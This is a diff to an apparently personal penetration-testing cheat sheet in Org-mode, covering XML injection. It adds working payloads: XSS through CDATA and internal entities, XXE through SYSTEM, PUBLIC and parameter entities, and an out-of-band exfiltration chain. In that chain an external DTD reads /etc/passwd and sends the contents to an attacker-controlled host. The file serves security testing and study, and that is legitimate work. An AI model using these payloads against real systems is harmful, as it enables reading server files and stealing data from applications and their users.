@@ -2299,7 +2299,7 @@
 *** XML
 **** Injection
 ***** Notes
-      - When injecting the XML, note that the DOCTYPE or ELEMENT may need to be defined before XML tags
+      - When injecting the XML, note that the DOCTYPE or ELEMENT may need to be defined before XML tags (doc's beginning)
 ***** XSS
       #+begin_src xml
         <!-- Try first -->
@@ -2307,9 +2307,15 @@
         <!-- CDATA is not parsed by XML -->
         <!-- Alternate -->
         <![CDATA[<]]>script<![CDATA[>]]>alert('xss')<![CDATA[<]]>/script<![CDATA[>]]>
+
+        <!-- Try with an internal XML entity -->
+        <?xml version="1.0" encoding="ISO-8859-1"?>
+        <!DOCTYPE test [<!ENTITY xxi "<script>alert('xss')</script>">]>
+        <test>&xxi;</test>
       #+end_src
 ***** XXE
       #+begin_src xml
+        <!-- Private (SYSTEM) -->
         <!-- "url" can be
              - a standard URL
              - file:///<full-path> - Dir trav
@@ -2329,6 +2335,33 @@
              Encode it to bypass this     -->
         <!DOCTYPE a [<!ENTITY test SYSTEM "php://filter/convert.base64-encode/resource=<rel-path>">]>
         <title>&test;</title>
+
+        <!-- Public -->
+        <!-- The id after PUBLIC is optional -->
+        <!DOCTYPE b [<!ENTITY pub PUBLIC "-//W3C//TEXT info//EN" "<path-to.xml>">]>
+        <title>&pub;</title>
+
+        <!-- Parameter Entities -->
+        <!DOCTYPE p [<!ENTITY % param SYSTEM "alert()"> <!ENTITY xss "<script>%param</script>">]>
+        <title>&xss;</title>
+
+        <!-- Exfiltrate data - External DTD -->
+        <!-- 1 - external.dtd file -->
+        <!ENTITY % content SYSTEM "file:///etc/passwd">
+        <!ENTITY % external "<!ENTITY &#37; exfil SYSTEM 'http://<attacker-ip>/out?%content;'>" >
+        <!-- Start a file server -->
+
+        <!-- 2 - Payload -->
+        <?xml version="1.0" encoding="utf-8"?>
+        <!DOCTYPE oob [
+        <!ENTITY % base SYSTEM "http://<attacker-ip>/external.dtd">
+        %base;
+        %external;
+        %exfil;
+        ]>
+        <bar>
+        </bar>
+        <!-- If errors try with /etc/timezone -->
       #+end_src
 **** XPath Injection
 ***** XCat
